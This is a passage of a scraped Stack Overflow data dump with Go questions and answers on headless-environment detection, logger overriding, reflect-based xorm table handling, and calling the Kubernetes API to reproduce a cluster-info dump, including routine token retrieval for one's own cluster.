"https://stackoverflow.com/questions/52964022/how-to-detect-if-the-current-go-process-is-running-in-a-headless-non-gui-envir/52987351#52987351", "title": "How to detect if the current Go process is running in a headless (non-GUI) environment?", "body": "<p>In the perceived absence of a library/solution for this, I've created one myself. <a href=\"https://github.com/christianhujer/isheadless\" rel=\"nofollow noreferrer\">https://github.com/christianhujer/isheadless</a></p>\n\n<p>Example Usage:</p>\n\n<pre><code>package main\n\nimport (\n    . \"fmt\"\n    . \"github.com/christianhujer/isheadless\"\n    . \"os\"\n)\n\nfunc main() {\n    headless := IsHeadless()\n    Fprintf(Stderr, \"%s: info: headless: %v\\n\", Args[0], headless)\n    Exit(map[bool]int{true: 0, false: 1}[headless])\n}\n</code></pre>\n\n<p>Example runs:</p>\n\n<pre><code>$ ./isheadless ; echo $?\n./isheadless: info: headless: false\n1\n$ DISPLAY= ./isheadless ; echo $?\n./isheadless: info: headless: true\n0\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 42799, "user_id": 720999, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/04ee78e90161fa1c4dce14d615315160?s=128&d=identicon&r=PG", "display_name": "kostix", "link": "https://stackoverflow.com/users/720999/kostix"}, "is_accepted": false, "score": 0, "last_activity_date": 1540465494, "creation_date": 1540465494, "answer_id": 52987766, "question_id": 52964022, "link": "https://stackoverflow.com/questions/52964022/how-to-detect-if-the-current-go-process-is-running-in-a-headless-non-gui-envir/52987766#52987766", "title": "How to detect if the current Go process is running in a headless (non-GUI) environment?", "body": "<p>Well, the answer to the question <em>precisely as it was stated</em>\nis to just look at what Java does in its <code>isHeadless()</code>.</p>\n\n<p><a href=\"https://hg.openjdk.java.net/jdk10/master/file/be620a591379/src/java.desktop/share/classes/java/awt/GraphicsEnvironment.java#l166\" rel=\"nofollow noreferrer\">Here</a> is what OpenJDK 10 does.</p>\n\n<p>I cannot copy the code as it would supposedly breach its license,\nbut in essense, the breakdown is as follows:</p>\n\n<ol>\n<li>Get system property \"java.awt.headless\"; use it, if found.</li>\n<li>Get system property \"javaplugin.version\"; if it exists,\nthe session is not headless. Use this value.</li>\n<li>Get system property \"os.name\". If it literally contains\nthe substring \"OS X\" and the system property \"awt.toolkit\"\nequals the string \"sun.awt.HToolkit\", the session is not headless.\nUse this value.</li>\n<li>Check whether the system property \"os.name\"\nequals one of \"Linux\", \"SunOS\", \"FreeBSD\", \"NetBSD\", \"OpenBSD\"\nor \"AIX\", and if so, try to find an environment variable \"DISPLAY\";\nif it's absent, the session is headless.</li>\n</ol>\n\n<p>As you can see, in reality the check is pretty lame\nand I fail to see any special treatment of Windows.</p>\n\n<p>Still, this answers your question precisely.</p>\n"}], "owner": {"reputation": 13980, "user_id": 3554264, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/TbLcc.jpg?s=128&g=1", "display_name": "Christian Hujer", "link": "https://stackoverflow.com/users/3554264/christian-hujer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 487, "favorite_count": 0, "accepted_answer_id": 52987351, "answer_count": 3, "score": -2, "last_activity_date": 1540465494, "creation_date": 1540368930, "last_edit_date": 1540455907, "question_id": 52964022, "link": "https://stackoverflow.com/questions/52964022/how-to-detect-if-the-current-go-process-is-running-in-a-headless-non-gui-envir", "title": "How to detect if the current Go process is running in a headless (non-GUI) environment?", "body": "<p>I have a Go program which wants to install a trayicon. In case the process is headless, that is, it will not be able to create a graphical user interface, the Go program still makes sense and shall run, but obviously it shall not install the trayicon.</p>\n\n<p>What is the way in Go how to detect whether the current Go process is headless?</p>\n\n<p>Currently, I use the following code:</p>\n\n<pre><code>func isHeadless() bool {\n    _, display := os.LookupEnv(\"DISPLAY\")\n    return !(runtime.GOOS == \"windows\" || display)\n}\n</code></pre>\n\n<p>This code works just fine on a \"normal\" Windows, Linux, or Mac OS X, and I bet it will also run just fine on FreeBSD, NetBSD, Dragonfly and many others.</p>\n\n<p>Still, that code obviously has a lot of problems:</p>\n\n<ul>\n<li>It assumes that Windows is never headless (wrong, what if the process was started without a user logged in, and also, there's Windows 10 IoT Core which can be configured to headless <a href=\"https://docs.microsoft.com/en-us/windows/iot-core/learn-about-hardware/headlessmode\" rel=\"nofollow noreferrer\">https://docs.microsoft.com/en-us/windows/iot-core/learn-about-hardware/headlessmode</a>)</li>\n<li>It doesn't support Android (of which there also is a headless version for IoT).</li>\n<li>It assumes that everything non-Windows has an X-Server and thus a DISPLAY environment variable (wrong, for example, Android)</li>\n</ul>\n\n<p>So, what is the correct way in Go to detect whether the current process is headless / running in a headless environment?</p>\n\n<p>I'm not looking for workarounds, like adding a <code>--headless</code> command line switch to my program. Because, I already <em>have</em> that anyway for users who have heads but want the program to behave as if it were headless.</p>\n\n<p>In some other programming environments, such capabilities exist. For example, Java has <code>java.awt.GraphicsEnvironment.isHeadless()</code>, and I'm looking for a similar capability in Go.</p>\n\n<p>Some people have suggested to simply try creating the UI, and catch the error. This does not work, at least not with the library that I use. I use <code>github.com/getlantern/systray</code>. When <code>systray.Run()</code> cannot create the UI, the process dies. My code to setup the system tray looks like this:</p>\n\n<pre><code>func setupSystray() { // called from main()\n    go func() {\n        systray.Run(onReady, nil)\n    }()\n}\n\nfunc onReady() {\n    systray.SetTitle(\"foo\")\n    // ...\n}\n</code></pre>\n\n<p>When I run this code on Linux with <code>DISPLAY</code> unset, the output is as following:</p>\n\n<pre><code>$ ./myapp-linux-amd64\nUnable to init server: Could not connect: Connection refused\n\n(myapp-linux-amd64:5783): Gtk-WARNING **: 19:42:37.914: cannot open display: \n$ echo $?\n1\n</code></pre>\n\n<p>It could be argued that this is a flaw in the library (and I have created a ticket on the library <a href=\"https://github.com/getlantern/systray/issues/71\" rel=\"nofollow noreferrer\">https://github.com/getlantern/systray/issues/71</a>), but nonetheless some other APIs and environments provide a function <code>isHeadless()</code>, and I'm looking for an equivalent in Golang.</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "edited": false, "score": 0, "creation_date": 1540367659, "post_id": 52963574, "comment_id": 92834009, "body": "Do you mean <code>fmt.Println()</code>? If so, I believe  the best you can do is create package that contains the same method and use that one instead of <code>fmt</code>.  As far as I know there is no way to overwrite base <code>fmt</code> package."}, {"owner": {"reputation": 407, "user_id": 3461549, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73440cf71c71747a010d5114de459b10?s=128&d=identicon&r=PG&f=1", "display_name": "msound", "link": "https://stackoverflow.com/users/3461549/msound"}, "edited": false, "score": 0, "creation_date": 1540381217, "post_id": 52963574, "comment_id": 92842312, "body": "As others have said, overrides are not possible. However, if it&#39;s logging related, have a look at gitHub.com/sirupsen/logrus which supports log hooks which you can use to perform any customizations."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540389139, "post_id": 52963574, "comment_id": 92847785, "body": "The line quoted is from an interface. Even in OO languages (which Go is not) you can&#39;t override methods of an interface, you can only implement them."}], "answers": [{"tags": [], "owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "is_accepted": false, "score": 5, "last_activity_date": 1540367697, "creation_date": 1540367697, "answer_id": 52963635, "question_id": 52963574, "link": "https://stackoverflow.com/questions/52963574/how-to-override-func-l-logger-printlnv-interface-method-golang/52963635#52963635", "title": "How to override func (l *Logger) Println(v ...interface{}) method golang?", "body": "<blockquote>\n  <p>How to override ... [a] method golang?</p>\n</blockquote>\n\n<p>Not at all. You simply cannot do this. Go does not provide <em>any</em> means of inheritance. Don't try, you will not succeed. You must use an other solution to your problem (which you did not state).</p>\n"}], "owner": {"reputation": 2393, "user_id": 2732224, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/bSvzW.jpg?s=128&g=1", "display_name": "Shivam", "link": "https://stackoverflow.com/users/2732224/shivam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 147, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1540367697, "creation_date": 1540367502, "question_id": 52963574, "link": "https://stackoverflow.com/questions/52963574/how-to-override-func-l-logger-printlnv-interface-method-golang", "title": "How to override func (l *Logger) Println(v ...interface{}) method golang?", "body": "<p>How to override println method in golang?</p>\n\n<blockquote>\n  <p><strong><code>func (l *Logger) Println(v ...interface{})</code></strong></p>\n</blockquote>\n"}, {"tags": ["go", "struct", "reflection", "slice", "go-xorm"], "answers": [{"comments": [{"owner": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "edited": false, "score": 0, "creation_date": 1540377527, "post_id": 52965065, "comment_id": 92840030, "body": "Either of these approaches does not produce any errors, however result it is the same as my attempt to store <code>XormStruct interface{}</code>.  <code>xorm.Find(&amp;entries)</code> return an empty <code>&amp;[]</code> Maybe the problem lies with xorm itself?"}, {"owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "reply_to_user": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "edited": false, "score": 0, "creation_date": 1540377695, "post_id": 52965065, "comment_id": 92840126, "body": "@liepumartins Make sure your mapping is correct. For example as I noted in the answer, you cannot use unexported fields (you must start field names with uppercase letters)."}, {"owner": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "edited": false, "score": 0, "creation_date": 1540378192, "post_id": 52965065, "comment_id": 92840432, "body": "I do have exported fields, sorry example was incorrect on that part. I updated question to illustrate what I mean with my previous comment."}, {"owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "reply_to_user": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "edited": false, "score": 0, "creation_date": 1540379361, "post_id": 52965065, "comment_id": 92841103, "body": "Please post the exact code that uses my solution and does not work for you. The code you included in the question is a &quot;hybrid&quot; of my and your solution, and wouldn&#39;t even compile. Also show if and how you handle errors."}, {"owner": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "edited": false, "score": 0, "creation_date": 1540379744, "post_id": 52965065, "comment_id": 92841348, "body": "Problem was <code>xorm.Find(&amp;entries)</code> should be <code>xorm.Find(entries)</code> if your solution is used, thanks!"}, {"owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "reply_to_user": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "edited": false, "score": 0, "creation_date": 1540379998, "post_id": 52965065, "comment_id": 92841494, "body": "@liepumartins Yup, sorry about that. My working playground links used <code>entries</code>, but left the <code>&amp;</code> sign in them when merged my playground solution with yours. Yes, it must be simply <code>entries</code> as that is already a pointer."}], "tags": [], "owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "is_accepted": true, "score": 0, "last_activity_date": 1540379954, "last_edit_date": 1540379954, "creation_date": 1540372096, "answer_id": 52965065, "question_id": 52963237, "link": "https://stackoverflow.com/questions/52963237/store-information-reference-about-structure/52965065#52965065", "title": "Store information/reference about structure", "body": "<p>You may use <a href=\"https://golang.org/pkg/reflect/#Type\" rel=\"nofollow noreferrer\"><code>reflect.Type</code></a> to represent / describe a Go type. And at runtime, you may use <a href=\"https://golang.org/pkg/reflect/#New\" rel=\"nofollow noreferrer\"><code>reflect.New()</code></a> to obtain a pointer to the zeroed value of this type wrapped in a <a href=\"https://golang.org/pkg/reflect/#Value\" rel=\"nofollow noreferrer\"><code>reflect.Value</code></a>. And if you need a slice instead of a single value, you may use <a href=\"https://golang.org/pkg/reflect/#SliceOf\" rel=\"nofollow noreferrer\"><code>reflect.SliceOf()</code></a>, or obtain the type descriptor of the slice value in the first place.</p>\n\n<p>If you store <code>refect.Type</code> values of your tables, this is how you can use it:</p>\n\n<pre><code>type Record struct {\n   TableName  string\n   PrimaryKey string\n   XormStruct reflect.Type\n}\n\nvar ListOfTables [...]Record {\n   {\"User\", \"id\", reflect.TypeOf((*User)(nil)).Elem()},\n   {\"Post\", \"post_id\", reflect.TypeOf((*Post)(nil)).Elem()},\n}\n\n// User is xorm struct\ntype User struct {\n   Id   int64\n   Name string\n}\n\n// Post is xorm struct\ntype Post struct {\n   Post_id int64\n   Name    string\n   Other   string\n}\n</code></pre>\n\n<p>Note you must use exported fields!</p>\n\n<p>And then handling the tables:</p>\n\n<pre><code>for _, rec := range ListOfTables {\n    entries := reflect.New(reflect.SliceOf(t.XormStruct)).Interface()\n    err := xorm.Find(entries)\n    // Handle error\n\n    err := xml.Marshal(entries)\n    // Handle error\n}\n</code></pre>\n\n<p>You can see a working example (proof of concept) of this (without <code>xorm</code> as that is not available on the Go Playground) using JSON: <a href=\"https://play.golang.org/p/N92gZgxxJWG\" rel=\"nofollow noreferrer\">Go Playground</a>.</p>\n\n<p>If you were to store <code>reflect.Type</code> values of slices in the first place:</p>\n\n<pre><code>var ListOfTables [...]Record {\n   {\"User\", \"id\", reflect.TypeOf([]User{})},\n   {\"Post\", \"post_id\", reflect.TypeOf([]Post{})},\n}\n</code></pre>\n\n<p>And using it is also simpler:</p>\n\n<pre><code>for _, rec := range ListOfTables {\n    entries := reflect.New(t.XormStruct).Interface()\n    err := xorm.Find(entries)\n    // Handle error\n\n    err := xml.Marshal(entries)\n    // Handle error\n}\n</code></pre>\n\n<p>See proof of concept of this: <a href=\"https://play.golang.org/p/X9odLMedemE\" rel=\"nofollow noreferrer\">Go Playground</a>.</p>\n\n<p>Note that if <code>Record</code> holds slice types (in the field <code>XormStruct</code>), should you ever need to access the type of the struct (the element type of the struct), you may use <code>Type.Elem()</code> for that.</p>\n"}], "owner": {"reputation": 434, "user_id": 741420, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/9ddc74fcecb93a364c844715c9fdad4c?s=128&d=identicon&r=PG", "display_name": "liepumartins", "link": "https://stackoverflow.com/users/741420/liepumartins"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 52965065, "answer_count": 1, "score": 2, "last_activity_date": 1540380045, "creation_date": 1540366215, "last_edit_date": 1540380045, "question_id": 52963237, "link": "https://stackoverflow.com/questions/52963237/store-information-reference-about-structure", "title": "Store information/reference about structure", "body": "<p>I am looking for a way to store information which struct a function should use. Each struct corresponds to certain database table.</p>\n\n<pre><code>type Record struct {\n   TableName string\n   PrimaryKey string\n   //XormStruct // how can I store User or Post here?\n   XormStruct2 interface{} // see I have tried below\n   XormStruct3 reflect.Type // see I have tried below\n}\n\nvar posts []Post\n\nvar ListOfTables [...]Record {\n   {\"User\", \"id\", User},\n   //{\"Post\", \"post_id\", Post},\n   {\"Post\", \"post_id\", posts, reflect.TypeOf([]Post{})},\n}\n\n// User is xorm struct\ntype User struct {\n   Id int64\n   Name string\n}\n\n// Post is xorm struct\ntype Post struct {\n   Post_id int64\n   Name string\n   Other string\n}\n</code></pre>\n\n<p>I want to be able to dynamically choose struct for table.</p>\n\n<pre><code>for _, rec := range ListOfTables {\n    //var entries []rec.XormStruct // this does not work, of course\n    //var entries []reflect.TypeOf(rec.XormStruct) // this does not work either\n    // xorm is *xorm.Engine\n    xorm.Find(&amp;entries)\n    //xorm.Find(&amp;rec.XormStruct2) //with interface{}, does not work - produces an empty &amp;[]\n    posts3 := reflect.New(rec.XormStruct3).Interface()\n    //xorm.Find(&amp;posts3) // same as above, produces empty &amp;[]\n    var posts []Post\n    xorm.Find(&amp;posts) // produces desired data\n\n    // afterwards I will do same to any table entries, e.g.\n    xml.Marshal(entries)\n    // so there is really no need to create identical functions for each table\n}\n</code></pre>\n\n<p>Goal DRY (I have about 30 tables, function is the same)</p>\n\n<p>I have tried:</p>\n\n<ul>\n<li><p>to use <code>reflect.TypeOf()</code>, but I do not understand if/how I can use it (<code>reflect.Type</code>) to define a new variable</p></li>\n<li><p>Define Record with <code>XormStruct interface{}</code> and for each ListOfTables entry create a slice e.g. <code>var posts []Post</code> and <code>{\"Post\", \"post_id\", posts},</code></p></li>\n<li><p>Searching SO and godocs</p></li>\n</ul>\n\n<p>It seems to me, that <code>xorm.Find()</code> is not \"happy\" about getting an <code>interface{}</code> instead of <code>[]Posts</code> even if it does not say so.</p>\n\n<p><strong>UPDATE:</strong>\nI believe the breaking difference is this:</p>\n\n<pre><code>spew.Dump(posts3) //posts3 := reflect.New(rec.XormStruct3).Interface()\n// (*[]main.Post)&lt;0x2312312&gt;(&lt;nil&gt;)\nspew.Dump(posts) //var posts []Post\n// ([]main.Post)&lt;nil&gt;\n</code></pre>\n\n<p><strong>SOLUTION</strong></p>\n\n<pre><code>posts3 := reflect.New(rec.XormStruct3).Interface()\nxorm.Find(posts3) // not &amp;posts3\n</code></pre>\n"}, {"tags": ["go", "kubernetes"], "answers": [{"comments": [{"owner": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "edited": false, "score": 0, "creation_date": 1540384122, "post_id": 52965505, "comment_id": 92844199, "body": "I need to take a snapshot of the cluster at a certain time. I know i can get individual resources like config map using the API but is there an API which will give me all the resources which i would get when i manually do cluster-info dump using kubectl"}, {"owner": {"reputation": 8315, "user_id": 4550110, "user_type": "registered", "accept_rate": 46, "profile_image": "https://graph.facebook.com/815056458554119/picture?type=large", "display_name": "Ijaz Ahmad Khan", "link": "https://stackoverflow.com/users/4550110/ijaz-ahmad-khan"}, "reply_to_user": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "edited": false, "score": 0, "creation_date": 1540385037, "post_id": 52965505, "comment_id": 92844790, "body": "@Bharath for that use case , you can use ark"}, {"owner": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "edited": false, "score": 0, "creation_date": 1540391766, "post_id": 52965505, "comment_id": 92849716, "body": "Yes Heptio&#39;s Ark would provide a backup of the cluster but that would require a design change and we are not looking for any design change right now. Plus the information i need now is just for manual analysis which could probably develop into a new application for us. So i am looking at a program level solution for this, especially using the kubernetes library."}], "tags": [], "owner": {"reputation": 8315, "user_id": 4550110, "user_type": "registered", "accept_rate": 46, "profile_image": "https://graph.facebook.com/815056458554119/picture?type=large", "display_name": "Ijaz Ahmad Khan", "link": "https://stackoverflow.com/users/4550110/ijaz-ahmad-khan"}, "is_accepted": false, "score": 0, "last_activity_date": 1540385007, "last_edit_date": 1540385007, "creation_date": 1540373272, "answer_id": 52965505, "question_id": 52963194, "link": "https://stackoverflow.com/questions/52963194/how-do-we-take-a-kubernetes-cluster-info-dump-using-the-kubernetes-api/52965505#52965505", "title": "How do we take a kubernetes cluster-info dump using the kubernetes api", "body": "<p><strong>Backup and restore cluster resources:</strong></p>\n\n<p><a href=\"https://medium.com/@marekbartik/kubernetes-in-production-snapshotting-cluster-state-41bd767ef14\" rel=\"nofollow noreferrer\">https://medium.com/@marekbartik/kubernetes-in-production-snapshotting-cluster-state-41bd767ef14</a></p>\n\n<p>Use ark for cluster backup and resotre:</p>\n\n<pre><code>ark schedule create &lt;SCHEDULE NAME&gt; --schedule \"0 7 * * *\"\n\nark restore create --from-backup &lt;BACKUP-NAME&gt;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "edited": false, "score": 0, "creation_date": 1540384059, "post_id": 52966456, "comment_id": 92844152, "body": "I guess my question wasn&#39;t clear. I actually need to do the kubectl cluster-info dump operation using the kubernetes api. i.e., i need the whole dump of the cluster by calling an API from my program instead of manually running the command &quot;kubectl cluster-info dump&quot;"}, {"owner": {"reputation": 4058, "user_id": 9928809, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5e7fd6b31a4a41febaef7ff868edc57?s=128&d=identicon&r=PG&f=1", "display_name": "Nick_Kh", "link": "https://stackoverflow.com/users/9928809/nick-kh"}, "reply_to_user": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "edited": false, "score": 0, "creation_date": 1540459411, "post_id": 52966456, "comment_id": 92877002, "body": "I guess it&#39;s not feasible as Kubernetes API does not provide a direct API call to achieve this, about that @wilbeibi already mentioned in his answer."}], "tags": [], "owner": {"reputation": 4058, "user_id": 9928809, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d5e7fd6b31a4a41febaef7ff868edc57?s=128&d=identicon&r=PG&f=1", "display_name": "Nick_Kh", "link": "https://stackoverflow.com/users/9928809/nick-kh"}, "is_accepted": false, "score": 2, "last_activity_date": 1540376245, "creation_date": 1540376245, "answer_id": 52966456, "question_id": 52963194, "link": "https://stackoverflow.com/questions/52963194/how-do-we-take-a-kubernetes-cluster-info-dump-using-the-kubernetes-api/52966456#52966456", "title": "How do we take a kubernetes cluster-info dump using the kubernetes api", "body": "<p>You can capture API calls by listing the output with verbose option in <code>kubectl cluster-info</code> command:</p>\n\n<p><code>kubectl cluster-info dump -v 9</code></p>\n\n<p>For example:</p>\n\n<blockquote>\n  <p>curl -k -v -XGET  -H \"Accept: application/json, <em>/</em>\" -H \"User-Agent:\n  kubectl/v1.12.1 (linux/amd64) kubernetes/4ed3216\"\n  '<a href=\"https://10.142.0.3:6443/api/v1/namespaces/kube-system/events\" rel=\"nofollow noreferrer\">https://10.142.0.3:6443/api/v1/namespaces/kube-system/events</a>'</p>\n</blockquote>\n\n<p>Get the token for authorization purpose in your cluster:</p>\n\n<p><code>MY_TOKEN=\"$(kubectl get secret &lt;default-secret&gt; -o jsonpath='{$.data.token}' | base64 -d)\"</code></p>\n\n<p>Now you can make API call for the target resource:</p>\n\n<pre><code>curl -k -v -H \"Authorization : Bearer $MY_TOKEN\" https://10.142.0.3:6443/api/v1/namespaces/kube-system/events\n</code></pre>\n\n<p>Keep in mind that you may require role binding in order to grant view permission for your service account:</p>\n\n<pre><code>apiVersion: rbac.authorization.k8s.io/v1beta1\nkind: ClusterRoleBinding\nmetadata:\n  name: default-view\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: view\nsubjects:\n  - kind: ServiceAccount\n    name: default\n    namespace: default\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "edited": false, "score": 1, "creation_date": 1540447191, "post_id": 52975882, "comment_id": 92870479, "body": "Thanks for confirming. I have written a custom class for now which does something similar to this. This will definitely help me to refine it into a more cleaner solution."}], "tags": [], "owner": {"reputation": 3242, "user_id": 1035859, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ZJECK.jpg?s=128&g=1", "display_name": "wilbeibi", "link": "https://stackoverflow.com/users/1035859/wilbeibi"}, "is_accepted": false, "score": 0, "last_activity_date": 1540406282, "creation_date": 1540406282, "answer_id": 52975882, "question_id": 52963194, "link": "https://stackoverflow.com/questions/52963194/how-do-we-take-a-kubernetes-cluster-info-dump-using-the-kubernetes-api/52975882#52975882", "title": "How do we take a kubernetes cluster-info dump using the kubernetes api", "body": "<p>I am afraid this is no such API to do that. <code>kubectl cluster-info dump</code> is also implemented based on k8s sdk.</p>\n\n<p>But you can refer the implementation and customize to your own needs.</p>\n\n<p><a href=\"https://github.com/kubernetes/kubernetes/blob/6fc89ae92d9d09bd70e74d32c6ba6b3d28e7bec7/pkg/kubectl/cmd/clusterinfo/clusterinfo_dump.go\" rel=\"nofollow noreferrer\">https://github.com/kubernetes/kubernetes/blob/6fc89ae92d9d09bd70e74d32c6ba6b3d28e7bec7/pkg/kubectl/cmd/clusterinfo/clusterinfo_dump.go</a></p>\n"}], "owner": {"reputation": 41, "user_id": 10550016, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12f86362fdecfb184232986d7f7953f8?s=128&d=identicon&r=PG&f=1", "display_name": "Bharath", "link": "https://stackoverflow.com/users/10550016/bharath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1243, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1546343241, "creation_date": 1540366033, "last_edit_date": 1546343241, "question_id": 52963194, "link": "https://stackoverflow.com/questions/52963194/how-do-we-take-a-kubernetes-cluster-info-dump-using-the-kubernetes-api", "title": "How do we take a kubernetes cluster-info dump using the kubernetes api", "body": "<p>Does kubernetes provide an API in its client library to get the cluster-info dump.\nI went through its API <a href=\"https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.12/#-strong-api-overview-strong-\" rel=\"nofollow noreferrer\">documentation</a> and could find any api which could actually do this.  </p>\n\n<p>What i do now:\nkubectl cluster-info dump --output-directory=\"dumpdir\"</p>\n\n<p>What i want:\nUsing client-go/kubernetes api libraries, make an API call to get this dump from a golang application. Is it possible?</p>\n\n<p>What i know:\nThere are individual API's for each resource which can provide all the information provided by the cluster-info dump, but i want to do it will a single API call.</p>\n\n<p>For example:\ngolang code:</p>\n\n<pre><code>coreClient := kubernetesapi.CoreV1()\nnodeList, err := coreClient.Nodes().List(metav1.ListOptions{})\n</code></pre>\n\n<p>This will give me a list of nodes. </p>\n\n<p>Is there an API which returns what \"kubectl cluster-info dump\" would give. So i can get all the details Programmatically.  </p>\n"}, {"tags": ["go", "sonarqube"], "answers": [{"comments": [{"owner": {"reputation": 364, "user_id": 6173660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/abb2361f859a0ed3e7915135a5379426?s=128&d=identicon&r=PG&f=1", "display_name": "iam thadiyan", "link": "https://stackoverflow.com/users/6173660/iam-thadiyan"}, "edited": false, "score": 0, "creation_date": 1556805228, "post_id": 53783933, "comment_id": 98559903, "body": "Is it possible to add a known bug just to confirm that sonarqube can catch it? A pointer is much appreciated."}, {"owner": {"reputation": 629, "user_id": 6619811, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-GgE_-pIeidI/AAAAAAAAAAI/AAAAAAAARRg/0kkX9SLO1R4/photo.jpg?sz=128", "display_name": "Alban A. - SonarSource Team", "link": "https://stackoverflow.com/users/6619811/alban-a-sonarsource-team"}, "reply_to_user": {"reputation": 364, "user_id": 6173660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/abb2361f859a0ed3e7915135a5379426?s=128&d=identicon&r=PG&f=1", "display_name": "iam thadiyan", "link": "https://stackoverflow.com/users/6173660/iam-thadiyan"}, "edited": false, "score": 0, "creation_date": 1556893810, "post_id": 53783933, "comment_id": 98594495, "body": "<code>x =+ 2</code> (instead 